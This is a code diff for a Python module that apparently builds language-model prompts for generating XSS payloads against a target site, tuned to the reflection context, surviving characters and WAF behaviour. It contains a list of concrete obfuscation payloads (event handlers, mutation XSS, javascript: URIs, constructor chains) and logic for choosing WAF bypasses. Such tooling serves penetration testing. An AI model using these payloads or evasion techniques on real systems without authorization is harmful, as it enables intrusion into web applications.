@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import json
+import logging
 import os
 import re
 import shutil
@@ -11,17 +12,17 @@ from urllib.parse import quote_plus
 
 import requests
 
+from ai_xss_generator.behavior import extract_behavior_profile
 from ai_xss_generator.findings import (
-    BYPASS_FAMILIES,
     Finding,
-    findings_prompt_section,
     infer_bypass_family,
     relevant_findings,
 )
 from ai_xss_generator.learning import build_memory_profile
-from ai_xss_generator.lessons import lessons_prompt_section
-from ai_xss_generator.payloads import base_payloads_for_context, rank_payloads
-from ai_xss_generator.types import ParsedContext, PayloadCandidate
+from ai_xss_generator.payloads import BASE_PAYLOADS, _match_payloads_to_context, base_payloads_for_context, rank_payloads
+from ai_xss_generator.types import ParsedContext, PayloadCandidate, StrategyProfile
+
+log = logging.getLogger(__name__)
 
 
 OLLAMA_BASE_URL = os.environ.get("OLLAMA_HOST", "http://127.0.0.1:11434").rstrip("/")
@@ -58,6 +59,29 @@ MODEL_ALIASES = {
 # Context extraction helpers
 # ---------------------------------------------------------------------------
 
+_STRATEGY_SCHEMA_BLOCK = """      "strategy": {
+        "attack_family": "short family label",
+        "delivery_mode_hint": "query | fragment | post | multi_param | same_page",
+        "encoding_hint": "raw | html_entity | url_encoded | mixed | whitespace_broken | quote_closure",
+        "session_hint": "same_page | navigate_then_fire | post_then_sink | authenticated_follow_up",
+        "follow_up_hint": "what to try next if this class misses",
+        "coordination_hint": "single_param | multi_param | fragment_only | same_tag_pivot"
+      },"""
+
+_GENERATION_PHASES = ("scout", "contextual", "research")
+
+
+def _resolve_generation_phases(
+    *,
+    deep: bool = False,
+    phases: tuple[str, ...] | None = None,
+) -> tuple[str, ...]:
+    if phases:
+        return tuple(phase for phase in phases if phase in _GENERATION_PHASES)
+    if deep:
+        return _GENERATION_PHASES
+    return ("scout",)
+
 def _extract_probe_context(context: ParsedContext) -> tuple[str, str, str]:
     """Return (primary_sink_type, context_type, surviving_chars) from context.
 
@@ -68,112 +92,1390 @@ def _extract_probe_context(context: ParsedContext) -> tuple[str, str, str]:
     context_type = ""
     surviving_chars = ""
 
+    # Prefer injectable SUBCONTEXT notes (structured JSON — avoids repr() escaping issues).
+    # A param may reflect in html_body (non-injectable) while a follow-up probe finds
+    # html_attr_url(href) as injectable — the injectable context must take priority.
+    subctx_prefix = "[probe:SUBCONTEXT] "
     for note in context.notes:
-        # e.g. "[probe:CONFIRMED] 'url' → html_attr_url(href) surviving='()/;`{}'"
-        m = re.search(r"\[probe:CONFIRMED\].*?→\s*(\w+)", note)
-        if m and not context_type:
-            context_type = m.group(1)
-        m2 = re.search(r"surviving='([^']*)'", note)
-        if m2 and not surviving_chars:
-            surviving_chars = m2.group(1)
+        if not note.startswith(subctx_prefix):
+            continue
+        try:
+            payload = json.loads(note[len(subctx_prefix):])
+        except Exception:
+            continue
+        if not isinstance(payload, dict):
+            continue
+        if not payload.get("is_injectable"):
+            continue
+        if not context_type:
+            context_type = str(payload.get("context_type") or "")
+        if not surviving_chars:
+            chars_list = payload.get("surviving_chars") or []
+            surviving_chars = "".join(sorted(str(c) for c in chars_list))
+
+    # Fall back: first CONFIRMED note (surviving chars are repr-encoded — parse conservatively)
+    if not context_type:
+        for note in context.notes:
+            m = re.search(r"\[probe:CONFIRMED\].*?→\s*(\w+)", note)
+            if m and not context_type:
+                context_type = m.group(1)
+        # surviving_chars fallback: re-read from SUBCONTEXT JSON for the chosen context
+        if context_type:
+            for note in context.notes:
+                if not note.startswith(subctx_prefix):
+                    continue
+                try:
+                    payload = json.loads(note[len(subctx_prefix):])
+                except Exception:
+                    continue
+                if str(payload.get("context_type") or "") == context_type and not surviving_chars:
+                    chars_list = payload.get("surviving_chars") or []
+                    surviving_chars = "".join(sorted(str(c) for c in chars_list))
 
     return sink_type, context_type, surviving_chars
 
 
-# ---------------------------------------------------------------------------
-# Prompt construction
-# ---------------------------------------------------------------------------
+def _extract_dom_runtime_context(context: ParsedContext) -> dict[str, str]:
+    """Return DOM runtime taint metadata embedded in context.notes, if present."""
+    prefix = "[dom:TAINT] "
+    for note in context.notes:
+        if not note.startswith(prefix):
+            continue
+        try:
+            payload = json.loads(note[len(prefix):])
+        except Exception:
+            continue
+        return {
+            "source_type": str(payload.get("source_type", "")),
+            "source_name": str(payload.get("source_name", "")),
+            "sink": str(payload.get("sink", "")),
+            "code_location": str(payload.get("code_location", "")),
+        }
+    return {}
 
-def _prompt_for_context(
+
+def _extract_reflected_subcontext(
+    context: ParsedContext,
+    desired_context: str = "",
+) -> dict[str, Any]:
+    """Return the best reflected subcontext note for the current reflected sink."""
+    prefix = "[probe:SUBCONTEXT] "
+    candidates: list[dict[str, Any]] = []
+    for note in context.notes:
+        if not note.startswith(prefix):
+            continue
+        try:
+            payload = json.loads(note[len(prefix):])
+        except Exception:
+            continue
+        if not isinstance(payload, dict):
+            continue
+        candidates.append(payload)
+
+    if not candidates:
+        return {}
+
+    desired = desired_context.strip()
+    if desired:
+        matching = [
+            item for item in candidates
+            if str(item.get("context_type", "") or "").strip() == desired
+        ]
+        if matching:
+            candidates = matching
+
+    best = candidates[0]
+    compact = {
+        "context_type": str(best.get("context_type", "") or ""),
+        "tag_name": str(best.get("tag_name", "") or ""),
+        "attr_name": str(best.get("attr_name", "") or ""),
+        "quote_style": str(best.get("quote_style", "") or ""),
+        "html_subcontext": str(best.get("html_subcontext", "") or ""),
+        "payload_shape": str(best.get("payload_shape", "") or ""),
+        "attacker_prefix": str(best.get("attacker_prefix", "") or ""),
+        "attacker_suffix": str(best.get("attacker_suffix", "") or ""),
+        "explanation": str(best.get("explanation", "") or ""),
+        "snippet": str(best.get("snippet", "") or ""),
+        "confidence": best.get("confidence", 0.0) or 0.0,
+    }
+    return {key: value for key, value in compact.items() if value not in ("", [], {}, None)}
+
+
+def _behavior_profile_section(context: ParsedContext) -> str:
+    profile = extract_behavior_profile(context)
+    if not profile:
+        return ""
+
+    compact = {
+        "delivery_mode": profile.get("delivery_mode", ""),
+        "waf_name": profile.get("waf_name", ""),
+        "browser_required": bool(profile.get("browser_required", False)),
+        "auth_required": bool(profile.get("auth_required", False)),
+        "frameworks": list(profile.get("frameworks", []) or [])[:4],
+        "reflected_params": int(profile.get("reflected_params", 0) or 0),
+        "injectable_params": int(profile.get("injectable_params", 0) or 0),
+        "reflection_contexts": list(profile.get("reflection_contexts", []) or [])[:6],
+        "reflection_transforms": list(profile.get("reflection_transforms", []) or [])[:4],
+        "discovery_styles": list(profile.get("discovery_styles", []) or [])[:4],
+        "probe_modes": list(profile.get("probe_modes", []) or [])[:4],
+        "tested_charsets": list(profile.get("tested_charsets", []) or [])[:4],
+        "dom_sources": list(profile.get("dom_sources", []) or [])[:4],
+        "dom_sinks": list(profile.get("dom_sinks", []) or [])[:6],
+        "observations": list(profile.get("observations", []) or [])[:4],
+    }
+    return "TARGET BEHAVIOR PROFILE:\n" + json.dumps(compact, indent=2) + "\n"
+
+
+def _waf_knowledge_data(context: ParsedContext) -> dict[str, Any]:
+    profile = getattr(context, "waf_knowledge", None) or {}
+    if not profile:
+        return {}
+    return {
+        "engine_name": profile.get("engine_name", ""),
+        "confidence": profile.get("confidence", 0.0),
+        "normalization": profile.get("normalization", {}),
+        "matching": profile.get("matching", {}),
+        "likely_pressure_points": list(profile.get("likely_pressure_points", []) or [])[:5],
+        "likely_blind_spots": list(profile.get("likely_blind_spots", []) or [])[:5],
+        "preferred_strategies": list(profile.get("preferred_strategies", []) or [])[:5],
+        "avoid_strategies": list(profile.get("avoid_strategies", []) or [])[:5],
+        "notes": list(profile.get("notes", []) or [])[:4],
+    }
+
+
+def _effective_constraints_data(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_lessons: list[Any] | None = None,
+) -> dict[str, Any]:
+    behavior = extract_behavior_profile(context) or {}
+    knowledge = _waf_knowledge_data(context)
+    sink_type, context_type, surviving_chars = _extract_probe_context(context)
+    dom_runtime = _extract_dom_runtime_context(context)
+
+    observed_blockers: list[str] = []
+    if behavior.get("browser_required"):
+        observed_blockers.append("browser_required")
+    if behavior.get("auth_required"):
+        observed_blockers.append("authenticated_state")
+    if surviving_chars:
+        observed_blockers.append("restricted_surviving_chars")
+    if waf:
+        observed_blockers.append(f"waf:{waf}")
+
+    observed_transforms = list(behavior.get("reflection_transforms", []) or [])[:4]
+    recommended_families = list(knowledge.get("preferred_strategies", []) or [])[:5]
+    deprioritized_families = list(knowledge.get("avoid_strategies", []) or [])[:5]
+    failed_families: list[str] = []
+    strategy_shifts: list[str] = []
+    delivery_shifts: list[str] = []
+    attempted_delivery_modes: list[str] = []
+    edge_blockers: list[str] = []
+    delivery_outcomes: list[str] = []
+    creative_techniques: list[str] = []
+
+    if past_lessons:
+        for lesson in past_lessons:
+            if getattr(lesson, "lesson_type", "") != "execution_feedback":
+                continue
+            metadata = getattr(lesson, "metadata", {}) or {}
+            for family in metadata.get("failed_families", []) or []:
+                family_text = str(family or "").strip()
+                if family_text and family_text not in failed_families:
+                    failed_families.append(family_text)
+            for shift in metadata.get("strategy_constraints", []) or []:
+                shift_text = str(shift or "").strip()
+                if shift_text and shift_text not in strategy_shifts:
+                    strategy_shifts.append(shift_text)
+            for shift in metadata.get("delivery_constraints", []) or []:
+                shift_text = str(shift or "").strip()
+                if shift_text and shift_text not in delivery_shifts:
+                    delivery_shifts.append(shift_text)
+            for mode in metadata.get("attempted_delivery_modes", []) or []:
+                mode_text = str(mode or "").strip()
+                if mode_text and mode_text not in attempted_delivery_modes:
+                    attempted_delivery_modes.append(mode_text)
+            for blocker in metadata.get("edge_blockers", []) or []:
+                blocker_text = str(blocker or "").strip()
+                if blocker_text and blocker_text not in edge_blockers:
+                    edge_blockers.append(blocker_text)
+            for outcome in metadata.get("delivery_outcomes", []) or []:
+                outcome_text = str(outcome or "").strip()
+                if outcome_text and outcome_text not in delivery_outcomes:
+                    delivery_outcomes.append(outcome_text)
+
+    if context_type == "html_attr_url":
+        if "scheme_fragmentation" not in recommended_families:
+            recommended_families.append("scheme_fragmentation")
+        creative_techniques.extend([
+            "split or fragment URL delivery when query-only delivery keeps missing",
+            "entity-encoded or whitespace-broken scheme shaping",
+        ])
+    if context_type in {"html_attr_value", "html_body"} or dom_runtime.get("sink") == "document.write":
+        if "quote_closure" not in recommended_families:
+            recommended_families.append("quote_closure")
+        creative_techniques.append("same-tag attribute pivots before broad full-tag escapes")
+    if surviving_chars and "<" not in surviving_chars and "plain_script_tag" not in deprioritized_families:
+        deprioritized_families.append("plain_script_tag")
+    if observed_transforms and "mixed_case_markup" not in recommended_families:
+        recommended_families.append("mixed_case_markup")
+        creative_techniques.append("numeric/entity-encoded alpha or other case-agnostic markup shaping")
+    if knowledge.get("normalization", {}).get("html_entity_decode") is False:
+        creative_techniques.append("HTML numeric/entity encoding when raw tokens are high-pressure")
+    if knowledge.get("normalization", {}).get("unicode_escape_decode") is False:
+        creative_techniques.append("Unicode-width or escaped-token variants only when the sink/parser plausibly preserves them")
+    for family in failed_families:
+        if family not in deprioritized_families:
+            deprioritized_families.append(family)
+
+    deduped_creative: list[str] = []
+    for item in creative_techniques:
+        if item not in deduped_creative:
+            deduped_creative.append(item)
+
+    return {
+        "confirmed_sink": sink_type or dom_runtime.get("sink", ""),
+        "reflection_context": context_type or "",
+        "observed_blockers": observed_blockers[:5],
+        "observed_transforms": observed_transforms,
+        "recommended_families": recommended_families[:5],
+        "deprioritized_families": deprioritized_families[:5],
+        "edge_blockers": edge_blockers[:5],
+        "delivery_outcomes": delivery_outcomes[:5],
+        "attempted_delivery_modes": attempted_delivery_modes[:4],
+        "required_strategy_shifts": strategy_shifts[:4],
+        "required_delivery_shifts": delivery_shifts[:4],
+        "creative_techniques": deduped_creative[:4],
+    }
+
+
+def _execution_feedback_data(past_lessons: list[Any] | None) -> dict[str, Any]:
+    if not past_lessons:
+        return {}
+
+    failed_families: list[str] = []
+    strategy_constraints: list[str] = []
+    delivery_constraints: list[str] = []
+    attempted_delivery_modes: list[str] = []
+    edge_blockers: list[str] = []
+    delivery_outcomes: list[str] = []
+    duplicate_payloads: list[str] = []
+    observations: list[str] = []
+
+    def _extend_unique(target: list[str], values: list[Any], limit: int) -> None:
+        for value in values:
+            text = str(value or "").strip()
+            if text and text not in target:
+                target.append(text)
+            if len(target) >= limit:
+                break
+
+    for lesson in past_lessons:
+        if getattr(lesson, "lesson_type", "") != "execution_feedback":
+            continue
+        metadata = getattr(lesson, "metadata", {}) or {}
+        _extend_unique(failed_families, metadata.get("failed_families", []) or [], 5)
+        _extend_unique(strategy_constraints, metadata.get("strategy_constraints", []) or [], 5)
+        _extend_unique(delivery_constraints, metadata.get("delivery_constraints", []) or [], 5)
+        _extend_unique(attempted_delivery_modes, metadata.get("attempted_delivery_modes", []) or [], 5)
+        _extend_unique(edge_blockers, metadata.get("edge_blockers", []) or [], 5)
+        _extend_unique(delivery_outcomes, metadata.get("delivery_outcomes", []) or [], 5)
+        _extend_unique(duplicate_payloads, metadata.get("duplicate_payloads", []) or [], 4)
+        observation = str(metadata.get("observation", "") or "").strip()
+        if observation and observation not in observations:
+            observations.append(observation)
+        if len(observations) >= 2:
+            break
+
+    if not any((failed_families, strategy_constraints, delivery_constraints, attempted_delivery_modes, edge_blockers, delivery_outcomes, duplicate_payloads, observations)):
+        return {}
+
+    return {
+        "failed_families": failed_families[:5],
+        "strategy_shifts": strategy_constraints[:5],
+        "delivery_shifts": delivery_constraints[:5],
+        "attempted_delivery_modes": attempted_delivery_modes[:5],
+        "edge_blockers": edge_blockers[:5],
+        "delivery_outcomes": delivery_outcomes[:5],
+        "duplicate_payloads": duplicate_payloads[:4],
+        "observations": observations[:2],
+    }
+
+
+def _context_envelope(
+    context: ParsedContext,
+    waf: str | None = None,
+    *,
+    compact: bool = False,
+) -> dict[str, Any]:
+    sink_type, context_type, surviving_chars = _extract_probe_context(context)
+    dom_runtime = _extract_dom_runtime_context(context)
+    reflected_subcontext = _extract_reflected_subcontext(context, desired_context=context_type)
+    behavior = extract_behavior_profile(context) or {}
+    if compact:
+        compact_envelope = {
+            "waf_hint": waf or behavior.get("waf_name", ""),
+            "frameworks": list(context.frameworks[:3]),
+            "reflection_transforms": list(behavior.get("reflection_transforms", []) or [])[:3],
+        }
+        return {
+            key: value
+            for key, value in compact_envelope.items()
+            if value not in ("", [], {}, None, False)
+        }
+    envelope: dict[str, Any] = {
+        "target_url": context.source,
+        "delivery_mode": behavior.get("delivery_mode", ""),
+        "primary_sink": sink_type or dom_runtime.get("sink", ""),
+        "reflection_context": context_type,
+        "surviving_special_chars": surviving_chars,
+        "reflection_transforms": list(behavior.get("reflection_transforms", []) or [])[:3],
+        "probe_modes": list(behavior.get("probe_modes", []) or [])[:2],
+        "discovery_styles": list(behavior.get("discovery_styles", []) or [])[:2],
+        "browser_required": bool(behavior.get("browser_required", False)),
+        "auth_required": bool(behavior.get("auth_required", False)),
+        "frameworks": list(context.frameworks[:3]),
+        "waf_hint": waf or behavior.get("waf_name", ""),
+    }
+    if dom_runtime:
+        envelope["dom_runtime"] = dom_runtime
+        if (dom_runtime.get("sink") or "").strip().lower() == "document.write":
+            envelope["dom_subcontext"] = _document_write_subcontext(context)
+    elif reflected_subcontext:
+        envelope["reflected_subcontext"] = reflected_subcontext
+    return {key: value for key, value in envelope.items() if value not in ("", [], {}, None, False)}
+
+
+def _planning_envelope(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+) -> dict[str, Any]:
+    effective = _effective_constraints_data(context, waf=waf, past_lessons=past_lessons)
+    waf_knowledge = _waf_knowledge_data(context)
+    envelope = {
+        "primary_families": list(effective.get("recommended_families", []) or [])[:3],
+        "avoid_families": list(effective.get("deprioritized_families", []) or [])[:4],
+        "observed_blockers": list(effective.get("observed_blockers", []) or [])[:4],
+        "observed_transforms": list(effective.get("observed_transforms", []) or [])[:3],
+        "delivery_modes_in_play": list(effective.get("attempted_delivery_modes", []) or [])[:3],
+        "delivery_outcomes": list(effective.get("delivery_outcomes", []) or [])[:3],
+        "required_strategy_shifts": list(effective.get("required_strategy_shifts", []) or [])[:3],
+        "required_delivery_shifts": list(effective.get("required_delivery_shifts", []) or [])[:3],
+        "creative_techniques": list(effective.get("creative_techniques", []) or [])[:3],
+    }
+    hint = str(strategy_hint or "").strip()
+    if hint:
+        envelope["strategy_hint"] = hint
+    if waf_knowledge:
+        envelope["waf_prior"] = {
+            "engine_name": waf_knowledge.get("engine_name", ""),
+            "preferred_strategies": list(waf_knowledge.get("preferred_strategies", []) or [])[:3],
+            "avoid_strategies": list(waf_knowledge.get("avoid_strategies", []) or [])[:3],
+        }
+    return {key: value for key, value in envelope.items() if value not in ("", [], {}, None)}
+
+
+def _failure_envelope(past_lessons: list[Any] | None) -> dict[str, Any]:
+    feedback = _execution_feedback_data(past_lessons)
+    if not feedback:
+        return {}
+    envelope = {
+        "failed_families": list(feedback.get("failed_families", []) or [])[:4],
+        "attempted_delivery_modes": list(feedback.get("attempted_delivery_modes", []) or [])[:4],
+        "edge_blockers": list(feedback.get("edge_blockers", []) or [])[:4],
+        "delivery_outcomes": list(feedback.get("delivery_outcomes", []) or [])[:4],
+        "duplicate_payloads": list(feedback.get("duplicate_payloads", []) or [])[:3],
+        "observations": list(feedback.get("observations", []) or [])[:2],
+    }
+    return {key: value for key, value in envelope.items() if value not in ("", [], {}, None)}
+
+
+def _context_envelope_section(
+    context: ParsedContext,
+    waf: str | None = None,
+    *,
+    compact: bool = False,
+) -> str:
+    return (
+        "CONTEXT ENVELOPE:\n"
+        + json.dumps(_context_envelope(context, waf=waf, compact=compact), indent=2)
+        + "\n"
+    )
+
+
+def _planning_envelope_section(
+    context: ParsedContext,
+    waf: str | None = None,
+    past_lessons: list[Any] | None = None,
+    strategy_hint: str | None = None,
+) -> str:
+    return (
+        "PLANNING ENVELOPE:\n"
+        + json.dumps(
+            _planning_envelope(
+                context,
+                waf=waf,
+                past_lessons=past_lessons,
+                strategy_hint=strategy_hint,
+            ),
+            indent=2,
+        )
+        + "\n"
+    )
+
+
+def _failure_envelope_section(past_lessons: list[Any] | None) -> str:
+    envelope = _failure_envelope(past_lessons)
+    if not envelope:
+        return ""
+    return "FAILURE ENVELOPE:\n" + json.dumps(envelope, indent=2) + "\n"
+
+
+def _success_envelope(past_lessons: list[Any] | None) -> list[dict[str, str]]:
+    successful: list[dict[str, str]] = []
+    seen_payloads: set[str] = set()
+    for lesson in past_lessons or []:
+        metadata = getattr(lesson, "metadata", {}) or {}
+        if not (metadata.get("execution_confirmed") or metadata.get("confirmed_execution")):
+            continue
+        payload = str(metadata.get("payload", "") or "").strip()
+        if not payload or payload in seen_payloads:
+            continue
+        seen_payloads.add(payload)
+        family = str(metadata.get("bypass_family", "") or "").strip()
+        item = {"payload": payload}
+        if family:
+            item["bypass_family"] = family
+        successful.append(item)
+        if len(successful) >= 5:
+            break
+    return successful
+
+
+def _success_envelope_section(past_lessons: list[Any] | None) -> str:
+    envelope = _success_envelope(past_lessons)
+    if not envelope:
+        return ""
+    return (
+        "PAYLOADS THAT EXECUTED - generate similar techniques but NOT identical:\n"
+        + json.dumps(envelope, indent=2)
+        + "\n"
+    )
+
+
+def _payload_item_field(item: Any, field: str, default: Any = "") -> Any:
+    if hasattr(item, field):
+        return getattr(item, field, default)
+    if isinstance(item, dict):
+        return item.get(field, default)
+    if field == "payload":
+        return item
+    return default
+
+
+def _reference_payload_examples(
+    reference_payloads: list[Any] | None,
+    *,
+    limit: int = 5,
+) -> list[dict[str, Any]]:
+    examples: list[dict[str, Any]] = []
+    seen_payloads: set[str] = set()
+    for item in reference_payloads or []:
+        payload = str(_payload_item_field(item, "payload", "") or "").strip()
+        if not payload or payload in seen_payloads:
+            continue
+        seen_payloads.add(payload)
+        tags = [
+            str(tag).strip()
+            for tag in (_payload_item_field(item, "tags", []) or [])
+            if str(tag).strip()
+        ]
+        bypass_family = str(_payload_item_field(item, "bypass_family", "") or "").strip()
+        if not bypass_family and tags:
+            bypass_family = infer_bypass_family(payload, tags)
+        example = {"payload": payload}
+        if bypass_family:
+            example["bypass_family"] = bypass_family
+        if tags:
+            example["tags"] = tags[:4]
+        examples.append(example)
+        if len(examples) >= limit:
+            break
+    return examples
+
+
+def _merged_reference_payloads(
+    reference_payloads: list[Any] | None,
+    past_lessons: list[Any] | None,
+) -> list[Any] | None:
+    merged: list[Any] = []
+    merged.extend(_success_envelope(past_lessons))
+    merged.extend(reference_payloads or [])
+    if not merged:
+        return None
+
+    deduped: list[Any] = []
+    seen_payloads: set[str] = set()
+    for item in merged:
+        payload = str(_payload_item_field(item, "payload", "") or "").strip()
+        if not payload or payload in seen_payloads:
+            continue
+        seen_payloads.add(payload)
+        deduped.append(item)
+    return deduped or None
+
+
+def _normalized_context_label(context_type: str) -> str:
+    normalized = (context_type or "").strip().lower()
+    if normalized.startswith("html_body"):
+        return "html_body"
+    if normalized.startswith("html_attr_value"):
+        return "html_attr_value"
+    if normalized.startswith("html_attr_url"):
+        return "html_attr_url"
+    if normalized.startswith("js_string_dq"):
+        return "js_string_dq"
+    if normalized.startswith("js_string_sq"):
+        return "js_string_sq"
+    if normalized.startswith("js_code"):
+        return "js_code"
+    if normalized.startswith("html_comment"):
+        return "html_comment"
+    return normalized
+
+
+def _similar_findings_examples(
+    past_findings: list[Finding] | None,
+    *,
+    context_type: str,
+    limit: int = 5,
+) -> list[dict[str, str]]:
+    if not past_findings:
+        return []
+
+    normalized_context = _normalized_context_label(context_type)
+    scored: list[tuple[int, Finding]] = []
+    seen_payloads: set[str] = set()
+    for finding in past_findings:
+        payload = str(finding.payload or "").strip()
+        if not payload or payload in seen_payloads:
+            continue
+        seen_payloads.add(payload)
+
+        finding_context = _normalized_context_label(finding.context_type)
+        score = 0
+        if finding_context == normalized_context:
+            score += 4
+        elif normalized_context and finding_context and normalized_context.split("_", 1)[0] == finding_context.split("_", 1)[0]:
+            score += 2
+        if finding.explanation:
+            score += 1
+        if finding.bypass_family:
+            score += 1
+        scored.append((score, finding))
+
+    scored.sort(key=lambda item: (-item[0], -item[1].confidence, item[1].payload))
+    return [
+        {
+            "payload": finding.payload,
+            "bypass_family": finding.bypass_family,
+            "context_type": finding.context_type,
+            "why_it_works": finding.explanation,
+        }
+        for _, finding in scored[:limit]
+    ]
+
+
+_OBFUSCATION_TECHNIQUES: dict[str, str] = {
+    "html_body": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Uncommon tags: <details open ontoggle=...>, <video onloadstart=...>, <svg onload=...>, <marquee onstart=...>\n"
+        "- Case/space variants: <ImG sRc=x OnErRoR=alert(1)>, unquoted attributes\n"
+        "- Mutation XSS (mXSS): </sty</style>le><img ...>, <listing><img ...></listing> — parser re-parses mangled markup\n"
+        "- Namespace confusion: SVG/MathML as context escapes — </p><svg><script>, <math><mtext><img ...>\n"
+        "- CSS context escape: </style><img src=x onerror=alert(1)>\n"
+        "- Encoded attribute names: &#x6f;nerror, &#111;nerror\n"
+    ),
+    "html_attr_value": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Attribute breakout: close the quote, inject handler — \" onmouseover=alert(1) x=\"\n"
+        "- Angle-bracket-free: stay inside the attribute, no < > needed — works when angle brackets are stripped\n"
+        "- Autofocus gadget: \" autofocus onfocus=alert(1) x=\" — fires on load, no click\n"
+        "- Case variants on handlers: OnMoUsEoVeR=, oNfOcUs=, OnInPuT=\n"
+        "- Entity-encoded quotes: &#x22; or &quot; to bypass quote filters\n"
+    ),
+    "html_attr_url": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- javascript: URI variants: jaVasCript:, java\\tscript: (tab in scheme)\n"
+        "- Leading whitespace bypass: \\x09javascript:, \\x0ajavascript:\n"
+        "- data: URI fallback: data:text/html,<script>alert(1)</script>\n"
+        "- Attribute breakout if quote survives: \" onmouseover=alert(1) href=\"#\n"
+        "- HTML entity in URL: &#106;avascript:\n"
+    ),
+    "js_string_dq": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Quote breakout: \\\"; to escape the double-quoted string\n"
+        "- Keyword splitting: 'al'+'ert'(1), top['al'+'ert'](1)\n"
+        "- Unicode function names: \\u0061lert(1), \\x61lert(1)\n"
+        "- Constructor chain: []['filter']['constructor']('alert(1)')()\n"
+        "- Nested template literal: `${`${alert(1)}`}` if backtick context is reachable\n"
+    ),
+    "js_string_sq": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Quote breakout: '; to escape the single-quoted string\n"
+        "- Keyword splitting: 'al'+'ert'(1), window['al'+'ert'](1)\n"
+        "- Unicode function names: \\u0061lert(1), \\x61lert(1)\n"
+        "- Constructor chain: []['filter']['constructor']('alert(1)')()\n"
+        "- Nested template literal: `${`${alert(1)}`}` if backtick context is reachable\n"
+    ),
+    "js_code": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Function constructor: Function('alert(1)')()\n"
+        "- Indirect eval: (0,eval)('alert(1)')\n"
+        "- Tagged template literal: Set.constructor`alert\\x281\\x29`()\n"
+        "- Prototype gadget: []['filter']['constructor']('alert(1)')()\n"
+        "- Unicode/hex function names: \\u0061lert, \\x61lert\n"
+        "- Nested template: `${`${alert(1)}`}`\n"
+    ),
+    "html_comment": (
+        "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+        "- Comment close breakout: --> or --!>\n"
+        "- Malformed comment escape: --><img src=x onerror=alert(1)>\n"
+    ),
+}
+
+_OBFUSCATION_TECHNIQUES_FALLBACK = (
+    "OBFUSCATION TECHNIQUES — select what fits, combine freely:\n"
+    "- HTML tag injection: SVG, MathML, uncommon HTML5 elements\n"
+    "- Encoding variants: HTML entities, Unicode escapes, URL percent-encoding\n"
+    "- Angle-bracket-free event handlers for attribute contexts\n"
+    "- Constructor/prototype gadgets for JS execution contexts\n"
+)
+
+
+def _obfuscation_techniques_section(context_type: str) -> str:
+    normalized = _normalized_context_label(context_type)
+    return _OBFUSCATION_TECHNIQUES.get(normalized, _OBFUSCATION_TECHNIQUES_FALLBACK)
+
+
+def _application_signals_section(
+    context_type: str,
+    surviving_chars: str,
+    waf: str | None,
+    past_lessons: list[Any] | None,
+    strategy_hint: str | None,
+    context: "ParsedContext | None" = None,
+) -> str:
+    """Focused application observations for deep mode — replaces fat planning/context envelopes."""
+    lines = [
+        f"Reflection context: {context_type or 'unknown'}",
+        f"Surviving chars: {surviving_chars or '(none confirmed)'}",
+    ]
+    if waf:
+        lines.append(f"WAF/filter: {waf}")
+
+    feedback = _execution_feedback_data(past_lessons)
+    if feedback:
+        blockers = [str(b) for b in (feedback.get("edge_blockers") or [])[:3] if b]
+        if blockers:
+            lines.append(f"Observed blockers: {', '.join(blockers)}")
+        outcomes = [str(o) for o in (feedback.get("delivery_outcomes") or [])[:2] if o]
+        if outcomes:
+            lines.append(f"Filter responses: {', '.join(outcomes)}")
+
+    # href/formaction bypass: when html_attr_url context has < surviving, the
+    # injection is in HTML body and needs a full <a href=javascript:> or
+    # <button formaction=javascript:> tag — NOT just a bare javascript: URI.
+    if context_type == "html_attr_url" and "<" in (surviving_chars or ""):
+        lines.append(
+            "INJECTION SHAPE: The parameter is reflected in the HTML BODY, not directly "
+            "inside an existing attribute. The sanitizer strips event handlers (onerror, "
+            "ontoggle, onload, etc.) but allows javascript: URIs in href/formaction. "
+            "INJECT A FULL TAG such as: "
+            '<a href="javascript:alert(1)">x</a> or '
+            '<button formaction="javascript:alert(1)">x</button>. '
+            "Do NOT inject a bare URI — it will render as plain text."
+        )
+
+    section = "WHAT WE KNOW ABOUT THIS APPLICATION:\n"
+    section += "\n".join(f"  {line}" for line in lines) + "\n"
+
+    # Include reflection structure and DOM runtime if available — high-value for targeted payloads
+    if context is not None:
+        dom_runtime = _extract_dom_runtime_context(context)
+        if dom_runtime:
+            section += "DOM RUNTIME:\n" + json.dumps(dom_runtime, indent=2) + "\n"
+        else:
+            reflected_subcontext = _extract_reflected_subcontext(context, desired_context=context_type)
+            if reflected_subcontext:
+                section += "REFLECTION STRUCTURE:\n" + json.dumps(reflected_subcontext, indent=2) + "\n"
+
+    observations = [str(o) for o in (feedback.get("observations") or [])[:2] if o] if feedback else []
+    if observations:
+        section += "OBSERVED BEHAVIOUR:\n"
+        section += "\n".join(f"  - {obs}" for obs in observations) + "\n"
+
+    hint = str(strategy_hint or "").strip()
+    if hint:
+        section += f"STRATEGY NOTE: {hint}\n"
+
+    return section
+
+
+def _similar_findings_section(
+    past_findings: list[Finding] | None,
+    *,
+    context_type: str,
+    limit: int = 5,
+) -> str:
+    examples = _similar_findings_examples(
+        past_findings,
+        context_type=context_type,
+        limit=limit,
+    )
+    if not examples:
+        return ""
+    return (
+        "PAYLOADS THAT EXECUTED IN SIMILAR CONTEXTS (use as inspiration, mutate don't copy):\n"
+        + json.dumps(examples, indent=2)
+        + "\n"
+    )
+
+
+def _seed_examples_for_context(
+    *,
+    context_type: str,
+    surviving_chars: str,
+    reference_payloads: list[Any] | None,
+    waf: str | None = None,
+) -> list[dict[str, Any]]:
+    # External reference payloads (e.g. from --public) take priority — they
+    # are already curated by the caller and represent the most relevant examples.
+    reference_examples = _reference_payload_examples(reference_payloads, limit=5)
+    if reference_examples:
+        return reference_examples
+
+    # Multi-tier seed pool: bootstrap (always) + survived WAF bypass + confirmed
+    # This is the primary seed source for every scan.
+    try:
+        from ai_xss_generator.seed_pool import SeedPool
+        pool = SeedPool()
+        pool_seeds = pool.select_seeds(context_type, waf=waf, n=6)
+        if pool_seeds:
+            return pool_seeds
+    except Exception:
+        pass
+
